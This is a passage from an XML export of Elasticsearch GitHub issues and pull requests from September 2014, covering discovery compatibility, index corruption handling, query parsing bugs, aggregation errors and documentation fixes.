</description><key id="42533638">7695</key><summary>Improve exception from Store.failIfCorrupted</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Exceptions</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T14:58:26Z</created><updated>2015-06-07T12:03:21Z</updated><resolved>2014-09-11T15:13:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-11T14:58:41Z" id="55276201">@rmuir can you review please
</comment><comment author="rmuir" created="2014-09-11T15:01:05Z" id="55276589">looks great, thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Discovery: back port #7558 to 1.x and add bwc protections of the new ping on master gone introduced in #7493</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7694</link><project id="" key="" /><description>The change in #7558 adds a flag to PingResponse. However, when unicast discovery is used,  this extra flag can not be serialized by the very initial pings as they do not know yet what node version they ping (i.e., they have to default to 1.0.0, which excludes changing the serialization format). This commit bypasses this problem by adding a dedicated action which only exist on nodes of version 1.4 or up. Nodes first try to ping this endpoint using 1.4.0 as a serialization version. If that fails they fall back to the pre 1.4.0 action. This is optimal if all nodes are on 1.4.0 or higher, with a small down side if the cluster has mixed versions - but this is a temporary state.

Further two bwc protections are added:
1) Disable the preference to nodes who previously joined the cluster if some of the pings are on version &lt; 1.4.0
2) Disable the rejoin on master gone functionality if some nodes in the cluster or version &lt; 1.4.0
</description><key id="42530478">7694</key><summary>Discovery: back port #7558 to 1.x and add bwc protections of the new ping on master gone introduced in #7493</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>blocker</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label></labels><created>2014-09-11T14:32:50Z</created><updated>2014-10-21T21:40:52Z</updated><resolved>2014-09-16T15:41:07Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-09-16T09:44:39Z" id="55719669">@s1monw , @javanna - I addressed all the feedback and rebase to the latest 1.x . Can you have another look?
</comment><comment author="s1monw" created="2014-09-16T14:04:10Z" id="55747116">I think I am fine with it LGTM
</comment><comment author="bleskes" created="2014-09-16T15:41:07Z" id="55762993">merged in 1.x &amp; 1.4
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Turn unexpected exceptions when reading segments into CorruptedIndexException</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7693</link><project id="" key="" /><description>Today if we run into exception like NumberFormatException or IAE
when we try to open a commit point to retrieve checksums and calculate
store metadata we just bubble them up. Yet, those are very likely index
corruptions. In such a case we should really mark the shard as
corrupted.
</description><key id="42528160">7693</key><summary>Turn unexpected exceptions when reading segments into CorruptedIndexException</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Exceptions</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T14:12:41Z</created><updated>2015-06-07T18:45:17Z</updated><resolved>2014-09-11T19:18:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-11T14:13:53Z" id="55269375">@bleskes @rmuir  can you take a look 
</comment><comment author="bleskes" created="2014-09-11T15:23:58Z" id="55280295">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOCS] clarification of breaking changes to 1.4 due to GET index API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7692</link><project id="" key="" /><description /><key id="42527555">7692</key><summary>[DOCS] clarification of breaking changes to 1.4 due to GET index API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T14:07:10Z</created><updated>2014-10-21T21:40:52Z</updated><resolved>2014-09-11T14:12:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-11T14:08:35Z" id="55268574">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove unused `search_query_hint` parameter</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7691</link><project id="" key="" /><description /><key id="42527160">7691</key><summary>Remove unused `search_query_hint` parameter</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:More Like This</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T14:03:26Z</created><updated>2015-06-07T18:45:35Z</updated><resolved>2014-09-11T15:35:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-11T14:15:23Z" id="55269570">Will requests using search_query_hint now fail in the parser in 1.4? if so we should probably update the breaking changes doc
</comment><comment author="javanna" created="2014-09-11T14:38:54Z" id="55273132">&gt; Will requests using search_query_hint now fail in the parser in 1.4? if so we should probably update the breaking changes doc

I think the parameter would just get ignored through the REST layer, no failures. Java API users would have a compilation error. Anyways I think nobody ever used this parameter since it did nothing, I would prefer not to promote it as breaking change then, but more as a bugfix :)
</comment><comment author="alexksikes" created="2014-09-11T14:57:54Z" id="55276075">Since the option did nothing, I agree it should rather be a bugfix. LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[Bug] GET failing if the ID haved a space after upgradation 1.20 -&gt; 1.3.2</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7690</link><project id="" key="" /><description>I have a document with a space in _id.
Elasticsearch is not able to GET that document now , even after URL encoding.
This was noticed after up-gradation to 1.3.2 from 1.2.0

Unfortunately i am not able to reproduce the issue as 1.2.0 download link in its page is broken - http://www.elasticsearch.org/downloads/1-2-0/
</description><key id="42524608">7690</key><summary>[Bug] GET failing if the ID haved a space after upgradation 1.20 -&gt; 1.3.2</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels /><created>2014-09-11T13:39:43Z</created><updated>2014-09-11T13:53:33Z</updated><resolved>2014-09-11T13:53:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T13:53:33Z" id="55266555">Hi @Vineeth-Mohan 

i don't think it is the space that is the problem.  It is v1.2.0 which had the problem, which is why the download page doesn't work.  See http://www.elasticsearch.org/blog/elasticsearch-1-2-1-released/ for an explanation
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>NullPointerException on ResourceWatcherService</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7689</link><project id="" key="" /><description>I made a mistake while i deployed a script. I created a file (instead of a directory) named "scripts" to save my script. And now, even if scripts is a directory (with the script inside), i got the following exception

`[2014-09-11 13:55:15,117][WARN ][threadpool               ] [Barristan] failed to run org.elasticsearch.watcher.ResourceWatcherService$ResourceMonitor@5985e4fa
java.lang.NullPointerException
    at org.elasticsearch.watcher.FileWatcher$FileObserver.updateChildren(FileWatcher.java:184)
    at org.elasticsearch.watcher.FileWatcher$FileObserver.checkAndNotify(FileWatcher.java:93)
    at org.elasticsearch.watcher.FileWatcher.doCheckAndNotify(FileWatcher.java:47)
    at org.elasticsearch.watcher.AbstractResourceWatcher.checkAndNotify(AbstractResourceWatcher.java:43)
    at org.elasticsearch.watcher.ResourceWatcherService$ResourceMonitor.run(ResourceWatcherService.java:102)
    at org.elasticsearch.threadpool.ThreadPool$LoggingRunnable.run(ThreadPool.java:440)
    at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
    at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:304)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:178)
    at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)`
</description><key id="42516059">7689</key><summary>NullPointerException on ResourceWatcherService</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/imotov/following{/other_user}', u'events_url': u'https://api.github.com/users/imotov/events{/privacy}', u'organizations_url': u'https://api.github.com/users/imotov/orgs', u'url': u'https://api.github.com/users/imotov', u'gists_url': u'https://api.github.com/users/imotov/gists{/gist_id}', u'html_url': u'https://github.com/imotov', u'subscriptions_url': u'https://api.github.com/users/imotov/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/655851?v=4', u'repos_url': u'https://api.github.com/users/imotov/repos', u'received_events_url': u'https://api.github.com/users/imotov/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/imotov/starred{/owner}{/repo}', u'site_admin': False, u'login': u'imotov', u'type': u'User', u'id': 655851, u'followers_url': u'https://api.github.com/users/imotov/followers'}</assignee><reporter username="">gregoryb</reporter><labels><label>bug</label></labels><created>2014-09-11T11:59:29Z</created><updated>2014-10-03T19:21:09Z</updated><resolved>2014-10-03T19:21:09Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="gregoryb" created="2014-09-12T09:53:02Z" id="55382341">ES v1.2.1
</comment><comment author="rjernst" created="2014-09-12T23:38:46Z" id="55473366">I'm not able to reproduce this.  I added a test, which passes on 1.x and the 1.2.1 release. Can you list of set of reproducible steps?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Netty: Make sure channel closing never happens on i/o thread</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7688</link><project id="" key="" /><description>Similar to NettyTransport.doStop() all actions which disconnect
from a node (and thus call awaitUnterruptibly) should not be executed
on the I/O thread.

This patch ensures that all disconnects happen in the generic threadpool.

Also added a missing return statement in case the component was not yet
started when catching an exception on the netty layer.
</description><key id="42515098">7688</key><summary>Netty: Make sure channel closing never happens on i/o thread</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels /><created>2014-09-11T11:44:45Z</created><updated>2014-09-15T15:34:01Z</updated><resolved>2014-09-15T15:33:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-15T15:33:57Z" id="55608083">Superseded by #7726 .
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[API] Fix minor issues with indices.get definition and tests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7687</link><project id="" key="" /><description>mark index param as required
make body match json, not string containing json
</description><key id="42513719">7687</key><summary>[API] Fix minor issues with indices.get definition and tests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">HonzaKral</reporter><labels /><created>2014-09-11T11:23:51Z</created><updated>2014-09-11T12:36:59Z</updated><resolved>2014-09-11T12:36:51Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="javanna" created="2014-09-11T12:35:18Z" id="55257184">LGTM
</comment><comment author="HonzaKral" created="2014-09-11T12:36:51Z" id="55257345">Merged in 480b90c
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ES not throwing parse exception `ids` query double-nested array</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7686</link><project id="" key="" /><description>[2014-09-11 11:47:51,946][DEBUG][index.search.slowlog.query] [n020] [index][3] took[3.1s], took_millis[3141], types[type], stats[], search_type[QUERY_THEN_FETCH], total_shards[5], source[{"size":12,"from":0,"sort":{"ats":"desc"},"query":{"filtered":{"query":{"query_string":{"query":"ten words string","fields":["title","tags"],"default_operator":"OR"}},"filter":{"bool":{"must":[{"range":{"ats":{"lte":1410428944}}},{"terms":{"aid":[27]}}],"must_not":[{"ids":{"values":[["ten-words-dash-separated-string"]]}}]}}}}}], extra_source[]
</description><key id="42508840">7686</key><summary>ES not throwing parse exception `ids` query double-nested array</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">teckays</reporter><labels><label>bug</label><label>low hanging fruit</label></labels><created>2014-09-11T10:13:52Z</created><updated>2014-10-01T08:35:27Z</updated><resolved>2014-10-01T08:35:27Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="cfontes" created="2014-09-18T01:45:41Z" id="55985527">Could you provide the REST command you used? 
It would make it easier for meto test and understand the issue.
</comment><comment author="teckays" created="2014-09-18T13:33:14Z" id="56038320">It was a simple Search query with params as query.
</comment><comment author="clintongormley" created="2014-09-25T18:36:38Z" id="56863433">This is the pertinent clause:

```
{"ids":{"values":[["ten-words-dash-separated-string"]]}
```

Note the double array
</comment><comment author="teckays" created="2014-09-26T12:26:02Z" id="56954533">Yes, I mentioned the double array which is a bug from my script, however as @dakrone pointed out, ES should throw a parsing error in this case which it did not.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>A `has_child` or other p/c query wrapped in a query filter may emit wrong results</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7685</link><project id="" key="" /><description>If a `has_child`, `has_parent` or `top_children` is indirectly wrapped in a `query` filter (for example via a `bool` query) then the results are incorrect. This bug manifests in all places in the dsl where `query` filter can be used.

This PR lets the `query` filter use the `CustomQueryWrappingFilter` class if the query being wrapped in a `query` filter indirectly uses a p/c query. (the case when p/c query was directly being wrapped was already covered). 

Also if a `query` filter is wrapping a p/c query (either directly or indirectly) any filter wrapping it if forcefully never cached. Caching this would also lead to wrong results, since the p/c queries can't be cached per segment, while regular filter can.
</description><key id="42498867">7685</key><summary>A `has_child` or other p/c query wrapped in a query filter may emit wrong results</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Parent/Child</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T08:06:29Z</created><updated>2015-06-07T18:47:15Z</updated><resolved>2014-09-12T15:49:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-12T07:33:38Z" id="55370486">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Bulk UDP: Deprecation.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7684</link><project id="" key="" /><description>See #7595 for removal in 2.0.
</description><key id="42498526">7684</key><summary>Bulk UDP: Deprecation.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>breaking</label><label>v1.4.0.Beta1</label></labels><created>2014-09-11T08:01:07Z</created><updated>2014-09-12T09:50:41Z</updated><resolved>2014-09-11T13:50:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T09:21:48Z" id="55239943">@jpountz could you add it here too please: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/breaking-changes-1.x.html
</comment><comment author="jpountz" created="2014-09-11T09:45:10Z" id="55242247">@clintongormley Agreed, just pushed an update.
</comment><comment author="clintongormley" created="2014-09-11T10:05:31Z" id="55244157">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove unused stream</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7683</link><project id="" key="" /><description /><key id="42496783">7683</key><summary>Remove unused stream</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Translog</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T07:34:19Z</created><updated>2015-06-07T12:03:35Z</updated><resolved>2014-09-11T08:04:47Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-11T07:37:59Z" id="55230114">good catch!! LGTM
</comment><comment author="dakrone" created="2014-09-11T07:38:40Z" id="55230169">LGTM too.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Alias not working in ES 1.2.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7681</link><project id="" key="" /><description>I have created an alias on index like this - 

POST /_aliases
{
    "actions" : [
        {
            "add" : {
                 "index" : "mainIndex",
                 "alias" : "sun",
                "filter" : { 
                      "or" : [
                {
                    "term" : { "name" : "Sun" }
                }
            ]
                 }
            }
        }
    ]
}

but when I try  GET sun/names/_search I don't see any data 

though the below works fine, 

GET mainIndex/names/_search?q=name:"Sun"  (It gives me the docs which have name "Sun") .I have seen this filter/alias problem quite frequently.Even the refresh doesn't help and alias does exist(GET mainIndex/_aliases).Any pointers would be helpful.
</description><key id="42493521">7681</key><summary>Alias not working in ES 1.2.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">anuragrk</reporter><labels /><created>2014-09-11T06:33:20Z</created><updated>2014-09-11T07:17:15Z</updated><resolved>2014-09-11T06:40:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="spinscale" created="2014-09-11T06:40:23Z" id="55225875">hey, please ask user questions like this on the google group, and provide all needed information, see http://www.elasticsearch.org/help

You are using a term filter, which uses unanalyzed terms, so trying to lower case your filter value should work.
</comment><comment author="anuragrk" created="2014-09-11T07:17:15Z" id="55228451">Thanks Alex for pointing out the right page for the help queries.And trying lower case did work. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add repository validation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7680</link><project id="" key="" /><description>Adds automatic and manual verification of repository settings and access rights.

Fixes #7096 
</description><key id="42481677">7680</key><summary>Add repository validation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">imotov</reporter><labels><label>:Snapshot/Restore</label><label>enhancement</label><label>release highlight</label><label>v1.4.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-11T01:59:18Z</created><updated>2015-06-07T12:03:46Z</updated><resolved>2014-10-08T11:51:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-11T13:36:07Z" id="55264217">I did a review, one more thing, can we call this API in the BWC tests too just to make sure we didn't break anything?
</comment><comment author="s1monw" created="2014-10-02T20:30:04Z" id="57700013">left only minor comments, LGTM and can go into 1.4?
</comment><comment author="s1monw" created="2014-10-07T13:28:25Z" id="58183569">@imotov can you bring this up to date and push ?
</comment><comment author="imotov" created="2014-10-08T11:51:46Z" id="58346019">Merged into 1.4, 1.x and master.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregation returns data in incorrect buckets when field defined in different index types have different data types</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7679</link><project id="" key="" /><description>This may be related to "Field resolution should be unambiguous #4081" (or can potentially be prevented via #4081).  Not sure.  Feel free to attach this to 4081 if it is indeed the same issue.

Repro test case:  https://gist.github.com/ppf2/4fdf1acaf40e9e1b4a3b

In short:
- created_at is defined in 2 different index types (typeDate and typeDouble) with 2 different data types.
- When issuing a date_histogram query against created_at, if you run this against the typeDouble first, the subsequent query that runs against the typeDate will return incorrect bucketing information (and incorrect fielddata value).
- So in this case when a query runs against typeDate (after another query has run against typeDouble), the aggregation is returning the right document, except that the fielddata value it read appears to be derived from the created_at value of the typeDouble.
- After clearing the cache for the index and re-running the typeDate query, it works correctly. 

The following is the response for the typeDate query that is run after the typeDouble query.  Even though the query has typeDate type specified, it is getting confused by the fielddata value of the typeDouble type.

```
{
   "took": 3,
   "timed_out": false,
   "_shards": {
      "total": 1,
      "successful": 1,
      "failed": 0
   },
   "hits": {
      "total": 1,
      "max_score": 0,
      "hits": []
   },
   "aggregations": {
      "NAME": {
         "buckets": [
            {
               "key_as_string": "1970-01-01T00:00:00.000Z",
               "key": 0,
               "doc_count": 1,
               "top": {
                  "hits": {
                     "total": 1,
                     "max_score": 1,
                     "hits": [
                        {
                           "_index": "date_histogram",
                           "_type": "typeDate",
                           "_id": "daterecord",
                           "_score": 1,
                           "_source": {
                              "created_at": "2014-09-10T19:32:15"
                           },
                           "fields": {
                              "created_at": [
                                 6.9681908771e-312
                              ]
                           }
                        }
                     ]
                  }
               }
            }
         ]
      }
   }
}
```
</description><key id="42477111">7679</key><summary>Aggregation returns data in incorrect buckets when field defined in different index types have different data types</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels /><created>2014-09-11T00:22:40Z</created><updated>2014-09-11T08:49:13Z</updated><resolved>2014-09-11T08:49:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T08:49:13Z" id="55236490">Hi @ppf2 

Yeah, there is no way around this currently. The solution is to prohibit mixed data types.  Closing in favour of #4081
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update thrift.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7678</link><project id="" key="" /><description>Fix typos, add clarifications and link.
</description><key id="42458877">7678</key><summary>Update thrift.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">zwass</reporter><labels><label>docs</label></labels><created>2014-09-10T20:47:46Z</created><updated>2014-09-24T18:53:12Z</updated><resolved>2014-09-24T18:53:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T08:47:34Z" id="55236338">Hi @zwass 

Thanks for the PR. Please could I ask you to sign the CLA so that I can merge this in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="zwass" created="2014-09-16T00:45:02Z" id="55680699">I have signed the CLA. Please let me know if there's anything else that you need.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Blacklist search results</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7677</link><project id="" key="" /><description>Not sure if this has been asked before on a different thread, checked both open and closed issues and couldn't find anything. 

I would like a way to blacklist certain search results, for different queries. The reason I don't want to not remove them from the initial search indexing is because I want them to be present on different queries. 

I know I can use the must_not clause in the bool query, but maybe there should be a blacklist clause too? 

Thoughts? 
</description><key id="42455636">7677</key><summary>Blacklist search results</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">faiq</reporter><labels /><created>2014-09-10T20:18:49Z</created><updated>2014-09-11T08:46:02Z</updated><resolved>2014-09-11T08:46:02Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-11T08:46:02Z" id="55236169">Hi @faiqus 

I don't think that black listing is a special case - it can be handled with existing functionality. There are two approaches you can use here:
- in your query, use an `ids` filter to exclude blacklisted documents, or
- add a field to your documents which allows you to filter them out at query time
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[docs] Fix misnamed setting</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7676</link><project id="" key="" /><description>The settings is `index.merge.policy.reclaim_deletes_weight` not
`index.reclaim_deletes_weight`.
</description><key id="42447753">7676</key><summary>[docs] Fix misnamed setting</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">nik9000</reporter><labels /><created>2014-09-10T18:59:46Z</created><updated>2014-09-11T08:42:23Z</updated><resolved>2014-09-11T08:42:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Refactor copy headers mechanism to not require a client factory</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7675</link><project id="" key="" /><description>With #7594 we replaced the static `BaseRestHandler#addUsefulHeaders` by introducing the `RestClientFactory` that can be injected and used to register the relevant headers. To simplify things, we can now register relevant headers through the `RestController` and remove the `RestClientFactory` that was just introduced.
